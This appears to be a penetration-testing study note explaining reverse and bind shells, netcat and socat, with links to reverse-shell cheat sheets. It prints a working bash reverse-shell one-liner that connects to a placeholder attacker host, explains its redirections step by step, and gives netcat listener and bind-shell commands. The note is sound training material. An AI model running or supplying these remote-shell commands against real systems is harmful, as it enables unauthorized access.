```

		░██     ░██            ░██ ░██                   ░██                
		░██     ░██            ░██ ░██                                      
		░██     ░██  ░███████  ░██ ░████████   ░███████  ░██░█████████████  
		░██████████ ░██    ░██ ░██ ░██    ░██ ░██    ░██ ░██░██   ░██   ░██ 
		░██     ░██ ░█████████ ░██ ░██    ░██ ░█████████ ░██░██   ░██   ░██ 
		░██     ░██ ░██        ░██ ░██    ░██ ░██        ░██░██   ░██   ░██ 
		░██     ░██  ░███████  ░██ ░██    ░██  ░███████  ░██░██   ░██   ░██

```


# What are shells?
---

Shells are what we use when we interact with command-line interfaces (CLI), such as bash, and zsh on linux, and Powershell on Windows. 

When targeting remote systems we can sometimes force an app running on the server to execute arbitrary code.

We want to then use this initial access to run a shell on the target.

We can trick the remote server to send us CLI access to the server (reverse shell),
Or to open up a port on the server which we can connect to (bind shell)

## Reverse shells vs Binding shells
---

### Reverse Shells

- Victim connects to attacker
- used to bypass firewalls that block incoming connections
- Example: ```bash -i >& /dev/tcp/(attacker_ip)/attacker_port 0>&1``` on the target machine, then run ```nc -lvnp (port_number)```

**Breaking down the commands**

 1️⃣ `bash -i`

- `-i`: **interactive mode**
    
- Starts an interactive bash shell so it behaves like a real terminal. 
---
 2️⃣ `>&/dev/tcp/(attacker_ip)/(attacker_port)`

- `/dev/tcp/` is a **special Bash feature**:
    
    - When you reference `/dev/tcp/IP/PORT`, Bash opens a TCP connection to that host/port.
        
- `>&`: redirects **both stdout and stderr** to that connection.  
    📡 So all the command output goes over the network to the attacker.
---
 3️⃣ `0>&1`

- `0>` Means **stdin** (keyboard input).
    
- `&1`: ties stdin to stdout (the TCP socket).  
    📥 This makes your attacker’s keystrokes get sent into the shell.

---
🏴‍☠️ **Effect**

The attacker can listen on the specified port and run commands on the victim box as if they're logged in

### Binding Shells
---
- Attacker connects to victim
- Example: `nc -l -p port` on the victim machine and then `nc attacker_ip port`

## General requirements 
--- 
In order to generate shells we need two things:

- Malicious code to generate the shell
- And a way to interface with the shell resulting from the code

## Common Tools
---
### 1 - Netcat

Netcat is used to perform all kinds of network interactions, like banner grabbing during enumeration, but it can also be used to receive reverse shells and connect to remote ports generated and attached to bind shells on the target system 

### Pros
- Easy Syntax
- Preinstalled on most linux distros
### Cons
- very unstable
- can be improved by certain techniques
---
### 2- Socat

Socat is exactly like Netcat but it can establish more stable shells

### Pros
- Incredible stability
- More features 

### Cons
- Difficult syntax
- Very rarely installed on distros
---
### [3 - MsfVenom](Muspelheim.md#MsfVenom)

--- 
### [4 - Multi/Handler](Muspelheim.md#Multi/Handler)



## Great online resources
---
### [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) / [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

A curated guide to internal network penetration testing, covering Active Directory exploitation, privilege escalation, lateral movement, and post-exploitation techniques. Perfect for red teamers operating inside corporate environments. Great for finding shell code.

---
### [Reverse Shell Cheatsheat](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

A compact collection of ready-to-use reverse shell payloads for a variety of languages and tools, including Bash, Python, PHP, and Netcat. Essential for quickly gaining command-line access during exploitation and post-exploitation phases.

---
